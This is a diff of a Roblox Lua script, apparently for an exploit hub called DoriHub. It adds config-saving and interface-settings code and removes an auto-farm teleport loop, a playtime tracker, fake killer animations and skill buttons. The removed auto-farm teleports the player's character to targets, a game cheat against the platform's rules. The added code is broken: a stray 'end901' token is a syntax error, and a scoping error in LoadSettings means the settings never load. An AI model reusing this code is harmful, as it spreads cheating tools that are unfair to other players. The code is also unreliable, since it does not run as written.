+		function SaveManager:Load(name)
+			if (not name) then
+				return false, "no config file is selected"
+			end
+
+			local file = self.Folder .. "/" .. name .. ".json"
+			if not isfile(file) then return false, "Create Config Save File" end
+
+			local success, decoded = pcall(httpService.JSONDecode, httpService, readfile(file))
+			if not success then return false, "decode error" end
+
+			for _, option in next, decoded.objects do
+				if self.Parser[option.type] and not self.Ignore[option.idx] then
+					task.spawn(function() self.Parser[option.type].Load(option.idx, option) end)
+				end
+			end
+
+			DoriHub.SettingLoaded = true
+
+			return true, decoded
+		end
+	end
+
+	function SaveManager:IgnoreThemeSettings()
+		self:SetIgnoreIndexes({ 
+			"InterfaceTheme", "AcrylicToggle", "TransparentToggle", "MenuKeybind"
+		})
+	end
+
+	function SaveManager:BuildFolderTree()
+		local paths = {
+			self.Folder,
+			self.Folder .. "/"
+		}
+
+		for i = 1, #paths do
+			local str = paths[i]
+			if not isfolder(str) then
+				makefolder(str)
+			end
+		end
+	end
+
+	function SaveManager:RefreshConfigList()
+		local list = listfiles(self.Folder .. "/")
+
+		local out = {}
+		for i = 1, #list do
+			local file = list[i]
+			if file:sub(-5) == ".json" then
+				local pos = file:find(".json", 1, true)
+				local start = pos
+
+				local char = file:sub(pos, pos)
+				while char ~= "/" and char ~= "\\" and char ~= "" do
+					pos = pos - 1
+					char = file:sub(pos, pos)
+				end
+
+				if char == "/" or char == "\\" then
+					local name = file:sub(pos + 1, start - 1)
+					if name ~= "options" then
+						table.insert(out, name)
+					end
+				end
+			end
+		end
+
+		return out
+	end
+
+	function SaveManager:SetLibrary(library)
+		self.Library = library
+		self.Options = library.Options
+	end
+
+	if not RunService:IsStudio() then
+		function SaveManager:LoadAutoloadConfig()
+			if isfile(self.Folder .. "/autoload.txt") then
+				local name = readfile(self.Folder .. "/autoload.txt")
+
+				local success, err = self:Load(name)
+				if not success then
+					return self.Library:Notify({
+						Title = "Interface",
+						Content = "Config loader",
+						SubContent = "Failed to load autoload config: " .. err,
+						Duration = 7
+					})
+				end
+
+				self.Library:Notify({
+					Title = "Interface",
+					Content = "Config loader",
+					SubContent = string.format("Auto loaded config %q", name),
+					Duration = 7
+				})
+			end
+		end
+	end
+
+	function SaveManager:BuildConfigSection(tab)
+		assert(self.Library, "Must set SaveManager.Library")
+
+		local section = tab:AddSection("Configuration", "settings")
+
+		section:AddInput("SaveManager_ConfigName",    { Title = "Config name" })
+		section:AddDropdown("SaveManager_ConfigList", { Title = "Config list", Values = self:RefreshConfigList(), AllowNull = true })
+
+		section:AddButton({
+			Title = "Create config",
+			Callback = function()
+				local name = SaveManager.Options.SaveManager_ConfigName.Value
+
+				if name:gsub(" ", "") == "" then 
+					return self.Library:Notify({
+						Title = "Interface",
+						Content = "Config loader",
+						SubContent = "Invalid config name (empty)",
+						Duration = 7
+					})
+				end
+
+				local success, err = self:Save(name)
+				if not success then
+					return self.Library:Notify({
+						Title = "Interface",
+						Content = "Config loader",
+						SubContent = "Failed to save config: " .. err,
+						Duration = 7
+					})
+				end
+
+				self.Library:Notify({
+					Title = "Interface",
+					Content = "Config loader",
+					SubContent = string.format("Created config %q", name),
+					Duration = 7
+				})
+
+				SaveManager.Options.SaveManager_ConfigList:SetValues(self:RefreshConfigList())
+				SaveManager.Options.SaveManager_ConfigList:SetValue(nil)
+			end
+		})
+
+		section:AddButton({Title = "Load config", Callback = function()
+			local name = SaveManager.Options.SaveManager_ConfigList.Value
+
+			local success, err = self:Load(name)
+			if not success then
+				return self.Library:Notify({
+					Title = "Interface",
+					Content = "Config loader",
+					SubContent = "Failed to load config: " .. err,
+					Duration = 7
+				})
+			end
+
+			self.Library:Notify({
+				Title = "Interface",
+				Content = "Config loader",
+				SubContent = string.format("Loaded config %q", name),
+				Duration = 7
+			})
+		end})
+
+		section:AddButton({Title = "Save config", Callback = function()
+			local name = SaveManager.Options.SaveManager_ConfigList.Value
+
+			local success, err = self:Save(name)
+			if not success then
+				return self.Library:Notify({
+					Title = "Interface",
+					Content = "Config loader",
+					SubContent = "Failed to overwrite config: " .. err,
+					Duration = 7
+				})
+			end
+
+			self.Library:Notify({
+				Title = "Interface",
+				Content = "Config loader",
+				SubContent = string.format("Overwrote config %q", name),
+				Duration = 7
+			})
+		end})
+
+		section:AddButton({Title = "Refresh list", Callback = function()
+			SaveManager.Options.SaveManager_ConfigList:SetValues(self:RefreshConfigList())
+			SaveManager.Options.SaveManager_ConfigList:SetValue(nil)
+		end})
+
+		local AutoloadButton
+		AutoloadButton = section:AddButton({Title = "Set as autoload", Description = "Current autoload config: none", Callback = function()
+			local name = SaveManager.Options.SaveManager_ConfigList.Value
+			writefile(self.Folder .. "/autoload.txt", name)
+			AutoloadButton:SetDesc("Current autoload config: " .. name)
+			self.Library:Notify({
+				Title = "Interface",
+				Content = "Config loader",
+				SubContent = string.format("Set %q to auto load", name),
+				Duration = 7
+			})
+		end})
+
+		if isfile(self.Folder .. "/autoload.txt") then
+			local name = readfile(self.Folder .. "/autoload.txt")
+			AutoloadButton:SetDesc("Current autoload config: " .. name)
+		end
+
+		SaveManager:SetIgnoreIndexes({ "SaveManager_ConfigList", "SaveManager_ConfigName" })
+	end
+
+	if not RunService:IsStudio() then
+		SaveManager:BuildFolderTree()
+	end
+end
+
+local InterfaceManager = {} do
+	InterfaceManager.Folder = "DoriHubSettings"
+	InterfaceManager.Settings = {
+		Acrylic = true,
+		Transparency = true,
+		MenuKeybind = "M"
+	}
+
+	function InterfaceManager:SetTheme(name)
+		InterfaceManager.Settings.Theme = name
+	end
+
+	function InterfaceManager:SetFolder(folder)
+		self.Folder = folder;
+		self:BuildFolderTree()
+	end
+
+	function InterfaceManager:SetLibrary(library)
+		self.Library = library
+	end
+
+	function InterfaceManager:BuildFolderTree()
+		local paths = {}
+
+		local parts = self.Folder:split("/")
+		for idx = 1, #parts do
+			paths[#paths + 1] = table.concat(parts, "/", 1, idx)
+		end
+
+		table.insert(paths, self.Folder)
+		table.insert(paths, self.Folder .. "/")
+
+		for i = 1, #paths do
+			local str = paths[i]
+			if not isfolder(str) then
+				makefolder(str)
+			end
+		end
+	end
+
+	function InterfaceManager:SaveSettings()
+		writefile(self.Folder .. "/options.json", httpService:JSONEncode(InterfaceManager.Settings))
+	end
+
+	function InterfaceManager:LoadSettings()
+		local path = self.Folder .. "/options.json"
+		if isfile(path) then
+			local data = readfile(path)
+
+			if not RunService:IsStudio() then local success, decoded = pcall(httpService.JSONDecode, httpService, data) end
+
+			if success then
+				for i, v in next, decoded do
+					InterfaceManager.Settings[i] = v
 				end
 			end
 		end
 	end
-	return false
+	function InterfaceManager:BuildInterfaceSection(tab)
+		assert(self.Library, "Must set InterfaceManager.Library")
+		local Library = self.Library
+		local Settings = InterfaceManager.Settings
+
+		InterfaceManager:LoadSettings()
+
+		local section = tab:AddSection("Interface", "monitor")
+		local InterfaceTheme = section:AddDropdown("InterfaceTheme", {
+			Title = "Theme",
+			Description = "Changes the interface theme.",
+			Values = Library.Themes,
+			Default = self.Library.Theme,
+			Callback = function(Value)
+				Library:SetTheme(Value)
+				Settings.Theme = Value
+				InterfaceManager:SaveSettings()
+			end
+		})
+
+		InterfaceTheme:SetValue(Settings.Theme)
+
+		if Library.UseAcrylic and not Mobile then
+			section:AddToggle("AcrylicToggle", {
+				Title = "Acrylic",
+				Description = "The blurred background requires graphic quality 8+",
+				Default = Settings.Acrylic,
+				Callback = function(Value)
+					Library:ToggleAcrylic(Value)
+					Settings.Acrylic = Value
+					InterfaceManager:SaveSettings()
+				end
+			})
+		elseif Mobile then
+			Settings.Acrylic = false
+		end
+
+		section:AddSlider("WindowTransparency", {
+			Title = "Window Transparency",
+			Description = "Adjusts the window transparency.",
+			Default = 1,
+			Min = 0,
+			Max = 3,
+			Rounding = 1,
+			Callback = function(Value)
+				Library:SetWindowTransparency(Value)
+			end
+		})
+
+
+		local MenuKeybind = section:AddKeybind("MenuKeybind", { Title = "Minimize Bind", Default = Library.MinimizeKey.Name or Settings.MenuKeybind })
+		MenuKeybind:OnChanged(function()
+			Settings.MenuKeybind = MenuKeybind.Value
+			InterfaceManager:SaveSettings()
+		end)
+		Library.MinimizeKeybind = MenuKeybind
+	end901
 end
 
--- === TÌM CÁC MODEL HỢP LỆ ===
-local function findTargets()
-	local list = {}
-	for _, obj in ipairs(workspace:GetDescendants()) do
-		if obj:IsA("Model") and isValidModel(obj) then
-			table.insert(list, obj)
-		end
-	end
-	return list
-end
+function Library:CreateWindow(Config)
+	assert(Config.Title, "Window - Missing Title")
 
--- === KIỂM TRA NHÂN VẬT ĐANG CHẠM MODEL HIỆN TẠI ===
-local function isTouchingTarget(target)
-	if not target or not target:IsDescendantOf(workspace) then
-		return false
-	end
-	local char = LocalPlayer.Character
-	if not char then return false end
-
-	local hrp = char:FindFirstChild("HumanoidRootPart")
-	if not hrp then return false end
-
-	local targetPart = target:FindFirstChild("HumanoidRootPart") or target.PrimaryPart or target:FindFirstChildWhichIsA("BasePart")
-	if not targetPart then return false end
-
-	local dist = (hrp.Position - targetPart.Position).Magnitude
-	return dist <= 6
-end
-
--- === TELEPORT SANG MODEL TIẾP THEO ===
-local function teleportToNext()
-	local humanoid, char = getHumanoid()
-	local hrp = char and char:FindFirstChild("HumanoidRootPart")
-	if not hrp then return end
-
-	-- Dọn dẹp model đã biến mất khỏi danh sách
-	for m in pairs(visitedModels) do
-		if not m:IsDescendantOf(workspace) then
-			visitedModels[m] = nil
-		end
-	end
-
-	-- Lấy danh sách hợp lệ
-	local allTargets = findTargets()
-	local available = {}
-	for _, m in ipairs(allTargets) do
-		if not visitedModels[m] and m:IsDescendantOf(workspace) then
-			table.insert(available, m)
-		end
-	end
-
-	-- Nếu hết mục tiêu thì reset visited để quét lại
-	if #available == 0 then
-		table.clear(visitedModels)
+	if Library.Window then
+		print("You cannot create more than one window.")
 		return
 	end
 
-	-- Chọn model gần nhất
-	table.sort(available, function(a, b)
-		local pa = getModelCFrame(a).Position
-		local pb = getModelCFrame(b).Position
-		return (hrp.Position - pa).Magnitude < (hrp.Position - pb).Magnitude
-	end)
+	if Config.UseToggleButton then
+		local TweenService = game:GetService("TweenService")
+		local UserInputService = game:GetService("UserInputService")
+		local RunService = game:GetService("RunService")
 
-	local nextTarget = available[1]
-	if nextTarget then
-		local cf = getModelCFrame(nextTarget)
-		if cf then
-			local pos = cf.Position
-			if pos.Y < -10 then
-				pos = Vector3.new(pos.X, HeightSafe, pos.Z)
+		local HideGui = Instance.new("ScreenGui")
+		HideGui.Name = "LagCatHubBtn"
+		HideGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+		HideGui.ResetOnSpawn = false
+		HideGui.Parent = GUI
+
+		local Zoomed = false
+		local SmallSize = 30
+		local BigSize = 40
+
+		local btnHide = Instance.new("TextButton", HideGui)
+		btnHide.BackgroundTransparency = 1
+		btnHide.Text = ""
+		btnHide.AnchorPoint = Vector2.new(0, 1)
+		btnHide.Size = UDim2.new(0, 50, 0, 50)
+		btnHide.Position = Config.ToggleButtonPosition or UDim2.new(0, 15, 1, -15)
+
+		local btnHideFrame = Instance.new("Frame", btnHide)
+		btnHideFrame.AnchorPoint = Vector2.new(0, 1)
+		btnHideFrame.Size = UDim2.new(0, 50, 0, 50)
+		btnHideFrame.Position = UDim2.new(0, 0, 1, 0)
+		btnHideFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		btnHideFrame.BackgroundTransparency = .25
+
+		local imgHide = Instance.new("ImageLabel", btnHide)
+		imgHide.BackgroundTransparency = 1
+		imgHide.Image = Config.ToggleButtonIcon or "rbxassetid://10734897102"
+		imgHide.AnchorPoint = Vector2.new(.5, .5)
+		imgHide.Position = UDim2.new(.5, 0, .5, 0)
+		imgHide.Size = UDim2.new(0, SmallSize, 0, SmallSize)
+
+		Instance.new("UICorner", btnHideFrame).CornerRadius = UDim.new(1, 0)
+
+		local function ToggleZoomState()
+			Zoomed = not Zoomed
+			local targetSize = Zoomed and BigSize or SmallSize
+			TweenService:Create(imgHide, TweenInfo.new(.2, Enum.EasingStyle.Quad), {
+				Size = UDim2.new(0, targetSize, 0, targetSize)
+			}):Play()
+		end
+
+		local dragging = false
+		local dragInput
+		local dragStart
+		local startPos
+		local holdTime = 0.1
+		local holdStarted = 0
+
+		local function update(input)
+			local delta = input.Position - dragStart
+			btnHide.Position = UDim2.new(
+				startPos.X.Scale,
+				startPos.X.Offset + delta.X,
+				startPos.Y.Scale,
+				startPos.Y.Offset + delta.Y
+			)
+		end
+
+		btnHide.InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				holdStarted = tick()
+				dragStart = input.Position
+				startPos = btnHide.Position
+
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						dragging = false
+						holdStarted = 0
+					end
+				end)
 			end
-			hrp.CFrame = CFrame.new(pos + Vector3.new(0, 3, 0))
-			currentTarget = nextTarget
-		end
-	end
-end
-
--- === VÒNG CHÍNH ===
-task.spawn(function()
-	while task.wait(ScanInterval) do
-		if autoTeleport and LocalPlayer.Character then
-			-- nếu target hiện tại biến mất, bỏ qua và chuyển model khác
-			if currentTarget and not currentTarget:IsDescendantOf(workspace) then
-				currentTarget = nil
-				task.wait(TeleportDelay)
-				teleportToNext()
-			elseif currentTarget and isTouchingTarget(currentTarget) then
-				visitedModels[currentTarget] = true
-				task.wait(TeleportDelay)
-				teleportToNext()
-			elseif not currentTarget then
-				teleportToNext()
-			end
-		end
-	end
-end)
-
--- === TOGGLE GUI ===
-Tabs.Event:AddToggle("AutoFarmSukkars", {
-	Title = "Auto Farm Sukkars",
-	Default = false,
-	Callback = function(state)
-		autoTeleport = state
-		if not state then
-			currentTarget = nil
-			table.clear(visitedModels)
-		end
-	end,
-})
-
-
--- Tabs.Custom
-
---// 🌌 Hệ Thống Tu Tiên (Fluent UI Paragraph v3)
--- Mỗi cấp 3h, 9 tầng (Nhất → Cửu Giai), có tiến trình Đột Phá %
-
-local HttpService = game:GetService("HttpService")
-local SaveFile = "TuTienData.json"
-
--- Danh sách cảnh giới (mỗi cấp = 3h = 10800s)
--- Phàm Nhân không có tầng
-local Levels = {
-    {name = "Phàm Nhân", time = 0, hasStage = false},
-    {name = "Kết Đan", time = 10800, hasStage = true},
-    {name = "Luyện Khí", time = 21600, hasStage = true},
-    {name = "Trúc Cơ", time = 32400, hasStage = true},
-    {name = "Kim Đan", time = 43200, hasStage = true},
-    {name = "Nguyên Anh", time = 54000, hasStage = true},
-    {name = "Hóa Thần", time = 64800, hasStage = true},
-    {name = "Luyện Hư", time = 75600, hasStage = true},
-    {name = "Hợp Thể", time = 86400, hasStage = true},
-    {name = "Đại Thừa", time = 97200, hasStage = true},
-    {name = "Độ Kiếp", time = 108000, hasStage = true},
-    {name = "Thánh Cảnh", time = 118800, hasStage = true},
-    {name = "Thánh Vương", time = 129600, hasStage = true},
-    {name = "Chí Tôn", time = 140400, hasStage = true},
-    {name = "Chuẩn Đế", time = 151200, hasStage = true},
-    {name = "Đại Đế", time = 162000, hasStage = true},
-}
-
--- Các tầng (mỗi tầng = 20 phút = 1200s)
-local Stages = {
-    "Nhất Giai",
-    "Nhị Giai",
-    "Tam Giai",
-    "Tứ Giai",
-    "Ngũ Giai",
-    "Lục Giai",
-    "Thất Giai",
-    "Bát Giai",
-    "Cửu Giai"
-}
-
--- Đọc dữ liệu
-local function LoadData()
-    if isfile and isfile(SaveFile) then
-        local success, decoded = pcall(function()
-            return HttpService:JSONDecode(readfile(SaveFile))
-        end)
-        if success and decoded then return decoded end
-    end
-    return {totalTime = 0}
-end
-
--- Lưu dữ liệu
-local function SaveData(data)
-    if writefile then
-        writefile(SaveFile, HttpService:JSONEncode(data))
-    end
-end
-
--- Tính Tu Vi, Tầng, Linh Khí %, Đột Phá %
-local function GetProgress(totalTime)
-    for i = #Levels, 1, -1 do
-        if totalTime >= Levels[i].time then
-            local current = Levels[i]
-            local nextLevel = Levels[i + 1]
-
-            if not nextLevel then
-                return current.name, (current.hasStage and "Cửu Giai" or nil), 1, 1
-            end
-
-            local levelDuration = 10800 -- 3h
-            local elapsedInLevel = totalTime - current.time
-            local percent = math.clamp(elapsedInLevel / levelDuration, 0, 1)
-
-            local stageName, breakthroughPercent
-            if current.hasStage then
-                local elapsedInStage = elapsedInLevel % 1200
-                local stageIndex = math.clamp(math.floor(elapsedInLevel / 1200) + 1, 1, #Stages)
-                stageName = Stages[stageIndex]
-                breakthroughPercent = math.clamp(elapsedInStage / 1200, 0, 1)
-            else
-                breakthroughPercent = 0
-            end
-
-            return current.name, stageName, percent, breakthroughPercent
-        end
-    end
-    return "Phàm Nhân", nil, 0, 0
-end
-
--- Dữ liệu hiện tại
-local Data = LoadData()
-
--- UI hiển thị
-local Paragraph = Tabs.Custom:AddParagraph({
-    Title = "Thông Tin",
-    Content = "Đang khởi động..."
-})
-
--- Vòng cập nhật
-task.spawn(function()
-    while task.wait(1) do
-        Data.totalTime += 1
-        local level, stage, percent, breakP = GetProgress(Data.totalTime)
-
-        local content = string.format("Tu Vi: %s\n", level)
-        if stage then
-            content ..= string.format("Tầng: %s\n", stage)
-        end
-        content ..= string.format("Linh Khí: %.1f%%\n", percent * 100)
-
-        -- Nếu có tầng thì hiện thêm Đột Phá %
-        if stage then
-            content ..= string.format("Đột Phá: %.1f%%", breakP * 100)
-        end
-
-        Paragraph:SetDesc(content)
-
-        -- Lưu định kỳ
-        if Data.totalTime % 10 == 0 then
-            SaveData(Data)
-        end
-
-        -- Khi đạt Đại Đế full
-        if level == "Đại Đế" and percent >= 1 then
-            Paragraph:SetDesc("Tu Vi: Đại Đế\nTầng: Cửu Giai\nLinh Khí: 100%\nĐột Phá: 100%")
-            break
-        end
-    end
-end)
-
-
-    Tabs.Custom:AddSection("Animation")
-
---// Fake Killers Anim System (hardened)
-do
-    local Players = game:GetService("Players")
-    local RunService = game:GetService("RunService")
-    local UserInputService = game:GetService("UserInputService")
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
-    local player = Players.LocalPlayer
-
-    -- thử require sprint module (nếu có)
-    local sprintModule
-    pcall(function()
-        sprintModule = require(ReplicatedStorage:WaitForChild("Systems").Character.Game.Sprinting)
-    end)
-
-    -- ==============================
-    -- 🟢 DỮ LIỆU KILLERS + SKINS (chỉ sửa ở đây)
-    -- ==============================
-    local KillersData = {
-        ["Survivors"] = {
-            ["Default"] = {
-                Idle = "rbxassetid://134624270247120",
-                Walk = "rbxassetid://132377038617766",
-                Run  = "rbxassetid://115946474977409",
-            }
-        },
-        ["Shasher"] = {
-            ["Default"] = {
-                Idle = "rbxassetid://116050994905421",
-                Walk = "rbxassetid://93622022596108",
-                Run  = "rbxassetid://93054787145505",
-            },
-            ["Pursuer"] = {
-                Idle = "rbxassetid://94895464960972",
-                Walk = "rbxassetid://100206079439305",
-                Run  = "rbxassetid://138660433982140",
-            },
-            ["subject_0"] = {
-                Idle = "rbxassetid://14301056458",
-                Walk = "rbxassetid://122325883800612",
-                Run  = "rbxassetid://97248175252805",
-            }
-        },
-        ["Coolkidd"] = {
-            ["Default"] = {
-                Idle = "rbxassetid://18885903667",
-                Walk = "rbxassetid://18885906143",
-                Run  = "rbxassetid://96571077893813",
-            }
-        },
-        ["John Doe"] = {
-            ["Default"] = {
-                Idle = "rbxassetid://105880087711722",
-                Walk = "rbxassetid://81193817424328",
-                Run  = "rbxassetid://132653655520682",
-            },
-            ["Shadow"] = {
-                Idle = "rbxassetid://00000000001",
-                Walk = "rbxassetid://00000000002",
-                Run  = "rbxassetid://00000000003",
-            }
-        },
-        ["Noli"] = {
-            ["Default"] = {
-                Idle = "rbxassetid://93841120533318",
-                Walk = "rbxassetid://109700476007435",
-                Run  = "rbxassetid://117451341682452",
-            }
-        },
-        ["1x1x1x1"] = {
-            ["Default"] = {
-                Idle = "rbxassetid://138754221537146",
-                Walk = "rbxassetid://131235528875091",
-                Run  = "rbxassetid://106485518413331",
-            },
-            ["Hacklord [Old]"] = {
-                Idle = "rbxassetid://82241652784826",
-                Walk = "rbxassetid://119242164490314",
-                Run  = "rbxassetid://92430101129682",
-            },
-            ["Hacklord [New]"] = {
-                Idle = "rbxassetid://106131211773069",
-                Walk = "rbxassetid://119112338263474",
-                Run  = "rbxassetid://85339002634979",
-            }
-        },
-        ["Herobrine"] = {
-            ["Default"] = {
-                Idle = "rbxassetid://107799240559806",
-                Walk = "rbxassetid://89380107485006",
-                Run  = "rbxassetid://134157363854022",
-            }
-        },
-        ["Gubby"] = {
-            ["Default"] = {
-                Idle = "rbxassetid://88333702239259",
-                Walk = "rbxassetid://115244584291581",
-                Run  = "rbxassetid://115244584291581",
-            }
-        },
-        ["Sancho"] = {
-            ["Default"] = {
-                Idle = "rbxassetid://115073581864188",
-                Walk = "rbxassetid://95213748170889",
-                Run  = "rbxassetid://75409814098993",
-            }
-        },
-        ["Erlking"] = {
-            ["Default"] = {
-                Idle = "rbxassetid://93727662665079",
-                Walk = "rbxassetid://97625643261790",
-                Run  = "rbxassetid://119357938208454",
-            }
-        },
-        ["Sukuna"] = {
-            ["Default"] = {
-                Idle = "rbxassetid://115268929362938",
-                Walk = "rbxassetid://123678890237669",
-                Run  = "rbxassetid://132086389849889",
-                Music = "rbxassetid://73595818073606" -- 🆕 nhạc đặc biệt
-            }
-        }
-    }
-    -- ==============================
-
-    -- state
-    local enabled = false
-    local selectedKiller = "Shasher"
-    local selectedSkin = "Default"
-    local character, humanoid, animator
-    local idleAnim, walkAnim, runAnim
-    local idleTrack, walkTrack, runTrack
-    local _isSprinting = false
-    local musicSound -- 🆕 biến giữ Sound object
-
-    -- conn
-    local runningConn, heartbeatConn, characterRemovingConn, inputBeganConn, inputEndedConn = nil, nil, nil, nil, nil
-    local heartbeatAccumulator = 0
-    local HEARTBEAT_CHECK_INTERVAL = 0.12
-
-    -- utility
-    local function stopAndClearTracks()
-        for _, track in ipairs({idleTrack, walkTrack, runTrack}) do
-            if track then pcall(function() track:Stop() end) end
-        end
-        idleTrack, walkTrack, runTrack = nil, nil, nil
-    end
-
-    local function stopMusic()
-        if musicSound then
-            pcall(function()
-                musicSound:Stop()
-                musicSound:Destroy()
-            end)
-            musicSound = nil
-        end
-    end
-
-    local function playMusicIfSukuna(set)
-        stopMusic()
-        if selectedKiller == "Sukuna" and set and set.Music then
-            local sound = Instance.new("Sound")
-            sound.SoundId = set.Music
-            sound.Looped = true
-            sound.Volume = 2
-            sound.Parent = workspace
-            sound:Play()
-            musicSound = sound
-        end
-    end
-
-    local function disconnectListeners()
-        for _, c in ipairs({runningConn, heartbeatConn, characterRemovingConn, inputBeganConn, inputEndedConn}) do
-            if c then pcall(function() c:Disconnect() end) end
-        end
-        runningConn, heartbeatConn, characterRemovingConn, inputBeganConn, inputEndedConn = nil, nil, nil, nil, nil
-    end
-
-    local function cleanupCurrentCharacter()
-        stopAndClearTracks()
-        stopMusic()
-        disconnectListeners()
-        animator, humanoid, character = nil, nil, nil
-    end
-
-    -- load anim objects theo killer + skin
-    local function loadAnimObjects(killer, skin)
-        local killerTable = KillersData[killer]
-        if not killerTable then
-            return
-        end
-        local set = killerTable[skin or "Default"] or killerTable["Default"]
-        if not set then return end
-
-        idleAnim, walkAnim, runAnim = Instance.new("Animation"), Instance.new("Animation"), Instance.new("Animation")
-        idleAnim.Name, walkAnim.Name, runAnim.Name = "IdleAnim", "WalkAnim", "RunAnim"
-        idleAnim.AnimationId, walkAnim.AnimationId, runAnim.AnimationId = set.Idle, set.Walk, set.Run
-
-        playMusicIfSukuna(set) -- 🆕 check phát nhạc nếu là Sukuna
-    end
-
-    -- play anim
-    local function playAnim(animObj, trackType)
-        if not animator then return end
-
-        if trackType ~= "Idle" and idleTrack then pcall(function() idleTrack:Stop() end) idleTrack=nil end
-        if trackType ~= "Walk" and walkTrack then pcall(function() walkTrack:Stop() end) walkTrack=nil end
-        if trackType ~= "Run" and runTrack then pcall(function() runTrack:Stop() end) runTrack=nil end
-
-        local track
-        if trackType=="Idle" and not idleTrack then idleTrack = animator:LoadAnimation(idleAnim) track=idleTrack
-        elseif trackType=="Walk" and not walkTrack then walkTrack = animator:LoadAnimation(walkAnim) track=walkTrack
-        elseif trackType=="Run" and not runTrack then runTrack = animator:LoadAnimation(runAnim) track=runTrack
-        else track = (trackType=="Idle" and idleTrack) or (trackType=="Walk" and walkTrack) or runTrack end
-
-        if track and not track.IsPlaying then pcall(function() track:Play() end) end
-    end
-
-    local function playIdle() playAnim(idleAnim,"Idle") end
-    local function playWalk() playAnim(walkAnim,"Walk") end
-    local function playRun() playAnim(runAnim,"Run") end
-
-    -- update state
-    local function updateMovementState()
-        if not enabled or not character then return end
-        local moving=false
-        if humanoid and humanoid.MoveDirection then
-            moving = humanoid.MoveDirection.Magnitude>0
-            if not moving then
-                local root = character:FindFirstChild("HumanoidRootPart") or character.PrimaryPart
-                if root and root.Velocity.Magnitude>1 then moving=true end
-            end
-        end
-        if moving then
-            local sprintingNow = (sprintModule and sprintModule.IsSprinting) or _isSprinting
-            if sprintingNow then playRun() else playWalk() end
-        else
-            playIdle()
-        end
-    end
-
-    -- listeners
-    local function setupMovementListeners()
-        disconnectListeners()
-        inputBeganConn = UserInputService.InputBegan:Connect(function(input,gp) if gp then return end if input.KeyCode==Enum.KeyCode.LeftShift then _isSprinting=true end end)
-        inputEndedConn = UserInputService.InputEnded:Connect(function(input,gp) if gp then return end if input.KeyCode==Enum.KeyCode.LeftShift then _isSprinting=false end end)
-
-        if humanoid and humanoid.Running then
-            runningConn = humanoid.Running:Connect(function(speed) if not enabled then return end if speed>0 then updateMovementState() else playIdle() end end)
-        else
-            heartbeatAccumulator=0
-            heartbeatConn = RunService.Heartbeat:Connect(function(dt)
-                if not enabled or not character then return end
-                heartbeatAccumulator+=dt
-                if heartbeatAccumulator>=HEARTBEAT_CHECK_INTERVAL then
-                    heartbeatAccumulator=0
-                    updateMovementState()
-                end
-            end)
-        end
-    end
-
-    -- bind character
-    local function onCharacterBound(char)
-        cleanupCurrentCharacter()
-        character=char
-        humanoid=char:FindFirstChildOfClass("Humanoid") or char:FindFirstChildOfClass("AnimationController")
-        if humanoid then
-            animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)
-        end
-        characterRemovingConn = char.AncestryChanged:Connect(function(_,parent) if not parent then cleanupCurrentCharacter() end end)
-        if enabled then
-            loadAnimObjects(selectedKiller, selectedSkin)
-            setupMovementListeners()
-            updateMovementState()
-        end
-    end
-
-    player.CharacterAdded:Connect(onCharacterBound)
-    if player.Character then onCharacterBound(player.Character) end
-
-    -- ===== UI =====
-    local killerNames = {}
-    for name,_ in pairs(KillersData) do table.insert(killerNames, name) end
-    table.sort(killerNames)
-
-    local SkinDropdown -- khai báo trước
-
-    -- dropdown chính (Killers)
-    local killerDropdown = Tabs.Custom:AddDropdown("ChooseKillersDropdown", {
-        Title = "Choose Killers",
-        Values = killerNames,
-        Default = selectedKiller,
-        Multi = false,
-        Callback = function(value)
-            local ok, err = pcall(function()
-                selectedKiller = value
-                selectedSkin = "Default"
-
-                local skins = {}
-                local t = KillersData[selectedKiller] or {}
-                for sName,_ in pairs(t) do table.insert(skins, sName) end
-                if #skins == 0 then skins = {"Default"} end
-                table.sort(skins)
-
-                if SkinDropdown and type(SkinDropdown.SetValues)=="function" and type(SkinDropdown.SetValue)=="function" then
-                    SkinDropdown:SetValues(skins)
-                    pcall(function() SkinDropdown:SetValue(skins[1] or "Default") end)
-                end
-
-                if enabled and player.Character then
-                    loadAnimObjects(selectedKiller, selectedSkin)
-                    stopAndClearTracks()
-                    updateMovementState()
-                else
-                    stopMusic()
-                end
-            end)
-            if not ok then warn("ChooseKillersDropdown callback error:", err) end
-        end
-    })
-
-    -- dropdown Skin (nằm dưới Killer)
-    SkinDropdown = Tabs.Custom:AddDropdown("ChooseSkinDropdown", {
-        Title = "Choose Skin",
-        Values = {"Default"},
-        Default = "Default",
-        Multi = false,
-        Callback = function(value)
-            local ok, err = pcall(function()
-                selectedSkin = value
-                if enabled and player.Character then
-                    loadAnimObjects(selectedKiller, selectedSkin)
-                    stopAndClearTracks()
-                    updateMovementState()
-                else
-                    stopMusic()
-                end
-            end)
-            if not ok then warn("SkinDropdown callback error:", err) end
-        end
-    })
-
-    -- toggle fake killers
-    Tabs.Custom:AddToggle("FakeKillersToggle", {
-        Title = "Fake Killers",
-        Default = false,
-        Callback = function(state)
-            local ok, err = pcall(function()
-                enabled = state
-                if enabled then
-                    if player.Character then
-                        loadAnimObjects(selectedKiller, selectedSkin)
-                        onCharacterBound(player.Character)
-                    end
-                else
-                    stopAndClearTracks()
-                    disconnectListeners()
-                    stopMusic()
-                end
-            end)
-            if not ok then warn("FakeKillersToggle callback error:", err) end
-        end
-    })
-end
-
-
-
-    Tabs.Custom:AddSection("Skill")
-
-
-do
--- LocalScript (StarterPlayerScripts)
-
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-
--- ⚡ Config
-local BUTTON_SIZE = 48
-local FramesLocked = true
-local screenGui
-local createdFrames = {}
-
--- dữ liệu các nút
-local buttonsData = {
-    {Name = "Btn1", AnimationId = "135853087227453", PlayMusic = true, MusicId = "81361259756089", ImageId = "134210378382767"},
-    {Name = "Btn2", AnimationId = "99784586201997", PlayMusic = false, ImageId = "134210378382767"},
-    {Name = "Btn3", AnimationId = "121162477402224", PlayMusic = true, MusicId = "120185817748858", ImageId = "85785826985052"},
-    {Name = "Btn4", AnimationId = "101816924844805", PlayMusic = true, MusicId = "88406027536494", ImageId = "85785826985052"},
-}
-
--- vị trí ban đầu
-local startPositions = {
